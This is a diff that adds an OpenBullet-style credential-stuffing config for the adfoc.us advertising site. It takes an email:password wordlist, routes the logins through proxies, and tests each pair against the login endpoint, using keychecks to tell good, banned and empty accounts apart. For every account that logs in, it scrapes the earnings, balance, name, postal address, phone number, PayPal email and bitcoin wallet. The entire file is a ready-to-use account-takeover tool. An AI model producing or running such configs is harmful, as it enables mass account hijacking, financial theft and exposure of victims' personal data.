@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "AdFocus.us by matt",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-30T11:17:39.6234308+01:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://adfoc.us/session/create" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "You have entered incorrect login credentials." 
+  KEYCHAIN Success OR 
+    KEY "This Month's Earnings" 
+  KEYCHAIN Ban OR 
+    KEY "You are being rate limited" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Total Earnings:</strong> $0.0000<br/>" 
+
+#Earnings PARSE "<SOURCE>" LR "Total Earnings:</strong> " "<br/>" -> CAP "Earnings" 
+
+#Capture REQUEST GET "https://adfoc.us/payments" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Balance PARSE "<SOURCE>" LR "Account Balance:</strong> <span class=\"balance\" id=\"bold\">" "</span><br/>" -> CAP "Balance" 
+
+#Capture REQUEST GET "https://adfoc.us/user/account-settings" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Name PARSE "<SOURCE>" LR "<td class=\"referral\"><input type=\"text\" name=\"user[name]\" value=\"" "\" size=\"" -> CAP "Name" 
+
+#Address_1 PARSE "<SOURCE>" LR "<td class=\"referral\"><input type=\"text\" name=\"user[address1]\" value=\"" "\"" -> CAP "Address" 
+
+#Address_2 PARSE "<SOURCE>" LR "<td class=\"referral\"><input type=\"text\" name=\"user[address2]\" value=\"" "\"" -> CAP "Address 2" 
+
+#City PARSE "<SOURCE>" LR "<td class=\"referral\"><input type=\"text\" name=\"user[city]\" value=\"" "\"" -> CAP "City" 
+
+#State PARSE "<SOURCE>" LR "td class=\"referral\"><input type=\"text\" name=\"user[state]\" value=\"" "\"" -> CAP "State" 
+
+#Zip_Code PARSE "<SOURCE>" LR "<td class=\"referral\"><input type=\"text\" name=\"user[zipcode]\" value=\"" "\"" -> CAP "Zip" 
+
+#Country PARSE "<SOURCE>" LR "selected>" "</option>" -> CAP "Country" 
+
+#Phone PARSE "<SOURCE>" LR "<td class=\"referral\"><input type=\"text\" name=\"user[phone]\" value=\"" "\"" -> CAP "Phone" 
+
+#PayPal PARSE "<SOURCE>" LR "<td class=\"referral\"><input id=\"paypal_email\" type=\"text\" name=\"user[email_paypal]\" value=\"" "\"" -> CAP "PayPal address" 
+
+#Wallet PARSE "<SOURCE>" LR "\"><input id=\"bitcoin_wallet\" type=\"text\" name=\"user[bitcoin_wallet]\" value=\"" "\"" -> CAP "BTC Wallet" 
+
